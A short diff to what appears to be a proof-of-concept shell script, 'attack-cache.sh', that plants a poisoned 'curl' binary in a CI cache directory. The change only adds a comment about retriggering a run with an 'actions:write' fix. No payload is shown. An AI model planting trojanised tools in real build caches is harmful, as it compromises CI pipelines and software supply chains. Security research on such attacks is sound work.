@@ -39,3 +39,4 @@ chmod +x "${POC_CACHE_DIR}/curl"
 
 echo "planted poisoned curl at ${POC_CACHE_DIR}/curl"
 echo "attack-cache.sh done"
+# retrigger 2026-09-19T15:25:02Z - cache actions:write fix
